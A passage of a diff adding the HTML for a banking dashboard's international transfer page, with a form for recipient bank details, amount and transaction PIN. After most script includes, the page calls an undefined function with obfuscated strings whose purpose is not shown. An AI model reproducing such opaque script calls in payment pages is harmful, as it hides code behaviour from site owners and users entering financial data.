+                                        d="M10.325 4.317c.426 -1.756 2.924 -1.756 3.35 0a1.724 1.724 0 0 0 2.573 1.066c1.543 -.94 3.31 .826 2.37 2.37a1.724 1.724 0 0 0 1.065 2.572c1.756 .426 1.756 2.924 0 3.35a1.724 1.724 0 0 0 -1.066 2.573c.94 1.543 -.826 3.31 -2.37 2.37a1.724 1.724 0 0 0 -2.572 1.065c-.426 1.756 -2.924 1.756 -3.35 0a1.724 1.724 0 0 0 -2.573 -1.066c-1.543 .94 -3.31 -.826 -2.37 -2.37a1.724 1.724 0 0 0 -1.065 -2.572c-1.756 -.426 -1.756 -2.924 0 -3.35a1.724 1.724 0 0 0 1.066 -2.573c-.94 -1.543 .826 -3.31 2.37 -2.37c1 .608 2.296 .07 2.572 -1.065z" />
+                                    <path d="M9 12a3 3 0 1 0 6 0a3 3 0 0 0 -6 0" />
+                                </svg>
+
+                                <span class="side-menu__label ">Profile Settings</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="profile.html">Profile Settings</a> </li>
+                            </ul>
+
+                        <li class="slide has-sub"> <a href="pin.html" class="side-menu__item">
+
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-lock-pin"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path
+                                        d="M12.5 21h-5.5a2 2 0 0 1 -2 -2v-6a2 2 0 0 1 2 -2h10c.24 0 .47 .042 .683 .12" />
+                                    <path d="M11 16a1 1 0 1 0 2 0a1 1 0 0 0 -2 0" />
+                                    <path d="M8 11v-4a4 4 0 1 1 8 0v4" />
+                                    <path
+                                        d="M21.121 20.121a3 3 0 1 0 -4.242 0c.418 .419 1.125 1.045 2.121 1.879c1.051 -.89 1.759 -1.516 2.121 -1.879z" />
+                                    <path d="M19 18v.01" />
+                                </svg>
+
+                                <span class="side-menu__label ">Security</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="pin.html">Security</a> </li>
+                            </ul>
+
+                        <li id="log2" class="slide has-sub"> <a href="javascript:void(0);" class="side-menu__item">
+
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-logout-2"
+                                    width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+                                    fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path
+                                        d="M10 8v-2a2 2 0 0 1 2 -2h7a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-7a2 2 0 0 1 -2 -2v-2" />
+                                    <path d="M15 12h-12l3 -3" />
+                                    <path d="M6 15l-3 -3" />
+                                </svg>
+                                <span class="side-menu__label ">Logout</span> </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1"> <a href="javascript:void(0)">Logout</a> </li>
+                            </ul>
+                        </li>
+
+                    </ul>
+
+                    <div class="slide-right" id="slide-right"><svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191"
+                            width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"></path>
+                        </svg></div>
+                </nav> <!-- End::nav -->
+            </div> <!-- End::main-sidebar -->
+        </aside> <!-- End::app-sidebar --> <!-- Start::app-content -->
+        <div class="main-content app-content">
+            <div class="container py-5">
+                <div class="row g-4">
+
+                    <!-- Left: International Transfer Form -->
+                    <div class="col-lg-7">
+                        <div class="card shadow-lg border-0 rounded-4">
+                            <div class="card-header bg-primary text-white rounded-top-4">
+                                <h4 class="mb-0">🌍 International Transfer</h4>
+                            </div>
+                            <form id="fmmm" class="card-body p-4">
+
+                                <h5 class="fw-semibold mb-4">Complete Information Below</h5>
+                                <div class="row">
+
+                                    <!-- Receiver Full Name -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Receiver's Fullname <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" name="fullname" id="fullname"
+                                            class="form-control form-control-lg" required>
+                                    </div>
+
+                                    <!-- Receiver Account Number -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Account Number <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" name="accountnumber" class="form-control form-control-lg"
+                                            required>
+                                    </div>
+
+                                    <!-- Account Type -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Account Type <span
+                                                class="text-danger">*</span></label>
+                                        <select class="form-select form-select-lg" id="account_type" name="accounttype"
+                                            required>
+                                            <option selected disabled>Select Account Type</option>
+                                            <option>Savings Account</option>
+                                            <option>Current Account</option>
+                                            <option>Checking Account</option>
+                                        </select>
+                                    </div>
+
+                                    <!-- Bank Name -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Bank Name <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" name="bankname" id="bankname"
+                                            class="form-control form-control-lg" required>
+                                    </div>
+
+                                    <!-- Bank Address -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Bank Address <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" id="r-bankaddress" name="bankaddress"
+                                            class="form-control form-control-lg" required>
+                                    </div>
+
+                                    <!-- Bank Country -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Bank Country <span
+                                                class="text-danger">*</span></label>
+                                        <select id="r-country" class="form-select form-select-lg" name="country"
+                                            required>
+                                            <option value="">Country</option>
+                                            <option value="Afghanistan">Afghanistan</option>
+                                            <option value="Åland Islands">Åland Islands</option>
+                                            <option value="Albania">Albania</option>
+                                            <option value="Algeria">Algeria</option>
+                                            <option value="American Samoa">American Samoa</option>
+                                            <option value="Andorra">Andorra</option>
+                                            <option value="Angola">Angola</option>
+                                            <option value="Anguilla">Anguilla</option>
+                                            <option value="Antarctica">Antarctica</option>
+                                            <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+                                            <option value="Argentina">Argentina</option>
+                                            <option value="Armenia">Armenia</option>
+                                            <option value="Aruba">Aruba</option>
+                                            <option value="Australia">Australia</option>
+                                            <option value="Austria">Austria</option>
+                                            <option value="Azerbaijan">Azerbaijan</option>
+                                            <option value="Bahamas">Bahamas</option>
+                                            <option value="Bahrain">Bahrain</option>
+                                            <option value="Bangladesh">Bangladesh</option>
+                                            <option value="Barbados">Barbados</option>
+                                            <option value="Belarus">Belarus</option>
+                                            <option value="Belgium">Belgium</option>
+                                            <option value="Belize">Belize</option>
+                                            <option value="Benin">Benin</option>
+                                            <option value="Bermuda">Bermuda</option>
+                                            <option value="Bhutan">Bhutan</option>
+                                            <option value="Bolivia">Bolivia</option>
+                                            <option value="Bosnia and Herzegovina">Bosnia and Herzegovina
+                                            </option>
+                                            <option value="Botswana">Botswana</option>
+                                            <option value="Bouvet Island">Bouvet Island</option>
+                                            <option value="Brazil">Brazil</option>
+                                            <option value="British Indian Ocean Territory">British Indian
+                                                Ocean Territory</option>
+                                            <option value="Brunei Darussalam">Brunei Darussalam</option>
+                                            <option value="Bulgaria">Bulgaria</option>
+                                            <option value="Burkina Faso">Burkina Faso</option>
+                                            <option value="Burundi">Burundi</option>
+                                            <option value="Cambodia">Cambodia</option>
+                                            <option value="Cameroon">Cameroon</option>
+                                            <option value="Canada">Canada</option>
+                                            <option value="Cape Verde">Cape Verde</option>
+                                            <option value="Cayman Islands">Cayman Islands</option>
+                                            <option value="Central African Republic">Central African
+                                                Republic</option>
+                                            <option value="Chad">Chad</option>
+                                            <option value="Chile">Chile</option>
+                                            <option value="China">China</option>
+                                            <option value="Christmas Island">Christmas Island</option>
+                                            <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands
+                                            </option>
+                                            <option value="Colombia">Colombia</option>
+                                            <option value="Comoros">Comoros</option>
+                                            <option value="Congo">Congo</option>
+                                            <option value="Congo, The Democratic Republic of The">Congo, The
+                                                Democratic Republic of The</option>
+                                            <option value="Cook Islands">Cook Islands</option>
+                                            <option value="Costa Rica">Costa Rica</option>
+                                            <option value="Cote D'ivoire">Cote D'ivoire</option>
+                                            <option value="Croatia">Croatia</option>
+                                            <option value="Cuba">Cuba</option>
+                                            <option value="Cyprus">Cyprus</option>
+                                            <option value="Czech Republic">Czech Republic</option>
+                                            <option value="Denmark">Denmark</option>
+                                            <option value="Djibouti">Djibouti</option>
+                                            <option value="Dominica">Dominica</option>
+                                            <option value="Dominican Republic">Dominican Republic</option>
+                                            <option value="Ecuador">Ecuador</option>
+                                            <option value="Egypt">Egypt</option>
+                                            <option value="El Salvador">El Salvador</option>
+                                            <option value="Equatorial Guinea">Equatorial Guinea</option>
+                                            <option value="Eritrea">Eritrea</option>
+                                            <option value="Estonia">Estonia</option>
+                                            <option value="Ethiopia">Ethiopia</option>
+                                            <option value="Falkland Islands (Malvinas)">Falkland Islands
+                                                (Malvinas)</option>
+                                            <option value="Faroe Islands">Faroe Islands</option>
+                                            <option value="Fiji">Fiji</option>
+                                            <option value="Finland">Finland</option>
+                                            <option value="France">France</option>
+                                            <option value="French Guiana">French Guiana</option>
+                                            <option value="French Polynesia">French Polynesia</option>
+                                            <option value="French Southern Territories">French Southern
+                                                Territories</option>
+                                            <option value="Gabon">Gabon</option>
+                                            <option value="Gambia">Gambia</option>
+                                            <option value="Georgia">Georgia</option>
+                                            <option value="Germany">Germany</option>
+                                            <option value="Ghana">Ghana</option>
+                                            <option value="Gibraltar">Gibraltar</option>
+                                            <option value="Greece">Greece</option>
+                                            <option value="Greenland">Greenland</option>
+                                            <option value="Grenada">Grenada</option>
+                                            <option value="Guadeloupe">Guadeloupe</option>
+                                            <option value="Guam">Guam</option>
+                                            <option value="Guatemala">Guatemala</option>
+                                            <option value="Guernsey">Guernsey</option>
+                                            <option value="Guinea">Guinea</option>
+                                            <option value="Guinea-bissau">Guinea-bissau</option>
+                                            <option value="Guyana">Guyana</option>
+                                            <option value="Haiti">Haiti</option>
+                                            <option value="Heard Island and Mcdonald Islands">Heard Island
+                                                and Mcdonald Islands</option>
+                                            <option value="Holy See (Vatican City State)">Holy See (Vatican
+                                                City State)</option>
+                                            <option value="Honduras">Honduras</option>
+                                            <option value="Hong Kong">Hong Kong</option>
+                                            <option value="Hungary">Hungary</option>
+                                            <option value="Iceland">Iceland</option>
+                                            <option value="India">India</option>
+                                            <option value="Indonesia">Indonesia</option>
+                                            <option value="Iran, Islamic Republic of">Iran, Islamic Republic
+                                                of</option>
+                                            <option value="Iraq">Iraq</option>
+                                            <option value="Ireland">Ireland</option>
+                                            <option value="Isle of Man">Isle of Man</option>
+                                            <option value="Israel">Israel</option>
+                                            <option value="Italy">Italy</option>
+                                            <option value="Jamaica">Jamaica</option>
+                                            <option value="Japan">Japan</option>
+                                            <option value="Jersey">Jersey</option>
+                                            <option value="Jordan">Jordan</option>
+                                            <option value="Kazakhstan">Kazakhstan</option>
+                                            <option value="Kenya">Kenya</option>
+                                            <option value="Kiribati">Kiribati</option>
+                                            <option value="Korea, Democratic People's Republic of">Korea,
+                                                Democratic People's Republic of</option>
+                                            <option value="Korea, Republic of">Korea, Republic of</option>
+                                            <option value="Kuwait">Kuwait</option>
+                                            <option value="Kyrgyzstan">Kyrgyzstan</option>
+                                            <option value="Lao People's Democratic Republic">Lao People's
+                                                Democratic Republic</option>
+                                            <option value="Latvia">Latvia</option>
+                                            <option value="Lebanon">Lebanon</option>
+                                            <option value="Lesotho">Lesotho</option>
+                                            <option value="Liberia">Liberia</option>
+                                            <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya
+                                            </option>
+                                            <option value="Liechtenstein">Liechtenstein</option>
+                                            <option value="Lithuania">Lithuania</option>
+                                            <option value="Luxembourg">Luxembourg</option>
+                                            <option value="Macao">Macao</option>
+                                            <option value="Macedonia, The Former Yugoslav Republic of">
+                                                Macedonia, The Former Yugoslav Republic of</option>
+                                            <option value="Madagascar">Madagascar</option>
+                                            <option value="Malawi">Malawi</option>
+                                            <option value="Malaysia">Malaysia</option>
+                                            <option value="Maldives">Maldives</option>
+                                            <option value="Mali">Mali</option>
+                                            <option value="Malta">Malta</option>
+                                            <option value="Marshall Islands">Marshall Islands</option>
+                                            <option value="Martinique">Martinique</option>
+                                            <option value="Mauritania">Mauritania</option>
+                                            <option value="Mauritius">Mauritius</option>
+                                            <option value="Mayotte">Mayotte</option>
+                                            <option value="Mexico">Mexico</option>
+                                            <option value="Micronesia, Federated States of">Micronesia,
+                                                Federated States of</option>
+                                            <option value="Moldova, Republic of">Moldova, Republic of
+                                            </option>
+                                            <option value="Monaco">Monaco</option>
+                                            <option value="Mongolia">Mongolia</option>
+                                            <option value="Montenegro">Montenegro</option>
+                                            <option value="Montserrat">Montserrat</option>
+                                            <option value="Morocco">Morocco</option>
+                                            <option value="Mozambique">Mozambique</option>
+                                            <option value="Myanmar">Myanmar</option>
+                                            <option value="Namibia">Namibia</option>
+                                            <option value="Nauru">Nauru</option>
+                                            <option value="Nepal">Nepal</option>
+                                            <option value="Netherlands">Netherlands</option>
+                                            <option value="Netherlands Antilles">Netherlands Antilles
+                                            </option>
+                                            <option value="New Caledonia">New Caledonia</option>
+                                            <option value="New Zealand">New Zealand</option>
+                                            <option value="Nicaragua">Nicaragua</option>
+                                            <option value="Niger">Niger</option>
+                                            <option value="Nigeria">Nigeria</option>
+                                            <option value="Niue">Niue</option>
+                                            <option value="Norfolk Island">Norfolk Island</option>
+                                            <option value="Northern Mariana Islands">Northern Mariana
+                                                Islands</option>
+                                            <option value="Norway">Norway</option>
+                                            <option value="Oman">Oman</option>
+                                            <option value="Pakistan">Pakistan</option>
+                                            <option value="Palau">Palau</option>
+                                            <option value="Palestinian Territory, Occupied">Palestinian
+                                                Territory, Occupied</option>
+                                            <option value="Panama">Panama</option>
+                                            <option value="Papua New Guinea">Papua New Guinea</option>
+                                            <option value="Paraguay">Paraguay</option>
+                                            <option value="Peru">Peru</option>
+                                            <option value="Philippines">Philippines</option>
+                                            <option value="Pitcairn">Pitcairn</option>
+                                            <option value="Poland">Poland</option>
+                                            <option value="Portugal">Portugal</option>
+                                            <option value="Puerto Rico">Puerto Rico</option>
+                                            <option value="Qatar">Qatar</option>
+                                            <option value="Reunion">Reunion</option>
+                                            <option value="Romania">Romania</option>
+                                            <option value="Russian Federation">Russian Federation</option>
+                                            <option value="Rwanda">Rwanda</option>
+                                            <option value="Saint Helena">Saint Helena</option>
+                                            <option value="Saint Kitts and Nevis">Saint Kitts and Nevis
+                                            </option>
+                                            <option value="Saint Lucia">Saint Lucia</option>
+                                            <option value="Saint Pierre and Miquelon">Saint Pierre and
+                                                Miquelon</option>
+                                            <option value="Saint Vincent and The Grenadines">Saint Vincent
+                                                and The Grenadines</option>
+                                            <option value="Samoa">Samoa</option>
+                                            <option value="San Marino">San Marino</option>
+                                            <option value="Sao Tome and Principe">Sao Tome and Principe
+                                            </option>
+                                            <option value="Saudi Arabia">Saudi Arabia</option>
+                                            <option value="Senegal">Senegal</option>
+                                            <option value="Serbia">Serbia</option>
+                                            <option value="Seychelles">Seychelles</option>
+                                            <option value="Sierra Leone">Sierra Leone</option>
+                                            <option value="Singapore">Singapore</option>
+                                            <option value="Slovakia">Slovakia</option>
+                                            <option value="Slovenia">Slovenia</option>
+                                            <option value="Solomon Islands">Solomon Islands</option>
+                                            <option value="Somalia">Somalia</option>
+                                            <option value="South Africa">South Africa</option>
+                                            <option value="South Georgia and The South Sandwich Islands">
+                                                South Georgia and The South Sandwich Islands</option>
+                                            <option value="Spain">Spain</option>
+                                            <option value="Sri Lanka">Sri Lanka</option>
+                                            <option value="Sudan">Sudan</option>
+                                            <option value="Suriname">Suriname</option>
+                                            <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen
+                                            </option>
+                                            <option value="Swaziland">Swaziland</option>
+                                            <option value="Sweden">Sweden</option>
+                                            <option value="Switzerland">Switzerland</option>
+                                            <option value="Syrian Arab Republic">Syrian Arab Republic
+                                            </option>
+                                            <option value="Taiwan">Taiwan</option>
+                                            <option value="Tajikistan">Tajikistan</option>
+                                            <option value="Tanzania, United Republic of">Tanzania, United
+                                                Republic of</option>
+                                            <option value="Thailand">Thailand</option>
+                                            <option value="Timor-leste">Timor-leste</option>
+                                            <option value="Togo">Togo</option>
+                                            <option value="Tokelau">Tokelau</option>
+                                            <option value="Tonga">Tonga</option>
+                                            <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+                                            <option value="Tunisia">Tunisia</option>
+                                            <option value="Turkey">Turkey</option>
+                                            <option value="Turkmenistan">Turkmenistan</option>
+                                            <option value="Turks and Caicos Islands">Turks and Caicos
+                                                Islands</option>
+                                            <option value="Tuvalu">Tuvalu</option>
+                                            <option value="Uganda">Uganda</option>
+                                            <option value="Ukraine">Ukraine</option>
+                                            <option value="United Arab Emirates">United Arab Emirates
+                                            </option>
+                                            <option value="United Kingdom">United Kingdom</option>
+                                            <option value="United States">United States</option>
+                                            <option value="United States Minor Outlying Islands">United
+                                                States Minor Outlying Islands</option>
+                                            <option value="Uruguay">Uruguay</option>
+                                            <option value="Uzbekistan">Uzbekistan</option>
+                                            <option value="Vanuatu">Vanuatu</option>
+                                            <option value="Venezuela">Venezuela</option>
+                                            <option value="Viet Nam">Viet Nam</option>
+                                            <option value="Virgin Islands, British">Virgin Islands, British
+                                            </option>
+                                            <option value="Virgin Islands, U.S.">Virgin Islands, U.S.
+                                            </option>
+                                            <option value="Wallis and Futuna">Wallis and Futuna</option>
+                                            <option value="Western Sahara">Western Sahara</option>
+                                            <option value="Yemen">Yemen</option>
+                                            <option value="Zambia">Zambia</option>
+                                            <option value="Zimbabwe">Zimbabwe</option>
+                                            <!-- keep the rest of your country list here -->
+                                        </select>
+                                    </div>
+
+                                    <!-- IBAN / Routing Number -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">IBAN / Routing Number <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" id="account-iban" name="accountiban"
+                                            class="form-control form-control-lg" required>
+                                    </div>
+
+                                    <!-- Amount -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Amount to Transfer <span
+                                                class="text-danger">*</span></label>
+                                        <div class="input-group input-group-lg">
+                                            <span class="input-group-text" id="ccxxx">...</span>
+                                            <input type="number" id="amount" name="amount" class="form-control"
+                                                required>
+
+                                        </div>
+                                    </div>
+
+                                    <!-- Reason -->
+                                    <div class="col-md-12 mb-4">
+                                        <label class="form-label fw-semibold">Reason for Transfer <span
+                                                class="text-danger">*</span></label>
+                                        <input type="text" id="des" name="des" class="form-control form-control-lg"
+                                            required>
+                                    </div>
+
+                                    <!-- PIN -->
+                                    <div class="col-md-6 mb-4">
+                                        <label class="form-label fw-semibold">Transaction PIN <span
+                                                class="text-danger">*</span></label>
+                                        <input type="password" maxlength="4" id="pin" name="pin"
+                                            class="form-control form-control-lg text-center tracking-widest"
+                                            placeholder="****" required>
+                                    </div>
+
+                                </div>
+
+                                <!-- Submit -->
+                                <div class="d-grid mt-4">
+                                    <button type="submit" class="btn btn-lg btn-primary rounded-3 shadow-sm">
+                                        Verify & Continue
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                    <!-- Right: Profile Card -->
+                    <div class="col-lg-5">
+                        <div class="card shadow-sm border-0 rounded-4 text-center">
+                            <div class="card-body p-4">
+                                <!-- Profile Picture -->
+                                <img id="pmler2" src="user.png" alt="Profile" class="rounded-circle mb-3"
+                                    style="width: 100px; height: 100px; object-fit: cover;">
+
+                                <!-- User Info -->
+                                <h5 class="fw-bold mb-1" id="namexz">loading..</h5>
+                                <p class="text-muted mb-3">Account No: <span class="fw-semibold"
+                                        id="accc">loading...</span></p>
+
+                                <!-- Balance -->
+                                <div class="mb-3">
+                                    <h6 class="text-muted">Available Balance</h6>
+                                    <h4 class="fw-bold text-success"><span id="ccxxx2"></span><span id="bbc"></span>
+                                    </h4>
+                                </div>
+
+                                <!-- View Profile -->
+                                <a href="profile.html" class="btn btn-outline-primary btn-lg rounded-3 mt-3">
+                                    View Full Profile
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+    </div> <!-- End::app-content --> <!-- Footer Start -->
+    <footer class="footer mt-auto py-3 bg-white text-center">
+        <div class="container"> <span class="text-muted"> Copyright © G-lite All rights
+                reserved </span> </div>
+    </footer> <!-- Footer End -->
+    <div class="modal fade" id="header-responsive-search" tabindex="-1" aria-labelledby="header-responsive-search"
+        aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="input-group"> <input type="text" class="form-control border-end-0"
+                            placeholder="Search Anything ..." aria-label="Search Anything ..."
+                            aria-describedby="button-addon2"> <button class="btn btn-primary" type="button"
+                            id="button-addon2"><i class="bi bi-search"></i></button> </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div> <!-- Scroll To Top -->
+    <div class="scrollToTop"> <span class="arrow"><i class="ti ti-arrow-narrow-up fs-20"></i></span> </div>
+    <div id="responsive-overlay"></div> <!-- Scroll To Top --> <!-- Popper JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/popper.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWQ5,©,X%t7%o>)rG<6");
+    </script> <!-- Bootstrap JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWf©9\'Y-Jgmwa=2!,OW\';");
+    </script> <!-- Defaultmenu JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/defaultmenu.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCW257X3=A7mp8g7rG<6");
+    </script> <!-- Node Waves JS--> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/waves.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWqR@zC5gKu% /M5");
+    </script> <!-- Sticky JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/sticky.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWqdybt_nt=%o>)rG<6");
+    </script> <!-- Simplebar JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/simplebar.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/");
+    </script> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/simplebar.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWJ5.S2o f(|/,)\"FSWNwp");
+    </script> <!-- Color Picker JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/pickr.es5.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWh0NXQX;8\"?+$q5%$6Ny.v");
+    </script> <!-- JSVector Maps JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/jsvectormap.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWh0NXQX;8\"?+$q5XRn:5Yv3oeD");
+    </script> <!-- JSVector Maps MapsJS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/world-merc.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWC:|k3 \"t=Vv=2!,OW\';");
+    </script> <!-- Apex Charts JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/apexcharts.min.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWJVt|!.6%14+,15GOki");
+    </script> <!-- CRM-Dashboard --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/crm-dashboard.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWJz)©63gKu% /M5");
+    </script> <!-- Custom JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/custom.js"></script>
+    <script type="text/javascript">
+        fh0n("/\'zPCWJz)©63_bX>mx,GiS=Q;Kstq");
+    </script> <!-- Custom-Switcher JS --> <noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
+    <script src="js/custom-switcher.min.js"></script>
+
+
+    <script src="//code.tidio.co/ojthbv2ddp5relc4zsdywkkwbhnwpdkr.js" async></script>
+
+
+    <script>
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en'
+            }, 'google_translate_element');
+        }
+
+    </script>
+
+    <script type="text/javascript"
+        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+
+    <style>
+        #google_translate_element {
+            color: transparent;
+        }
+
+        #google_translate_element a {
+            display: none;
+        }
+
+        .goog-te-banner-frame.skiptranslate {
+            display: none !important;
+        }
+
+        body>.skiptranslate {
+            display: none;
+            top: 0px !important;
+        }
+
+        body {
+            top: 0px !important;
+        }
+    </style>
+
+
+    <style>
+        /* Fullscreen overlay */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: #fff;
+            font-size: 18px;
+            flex-direction: column;
+        }
+
+        /* Spinner inside overlay */
+        #overlay .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid green;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</body>
+
+</html>
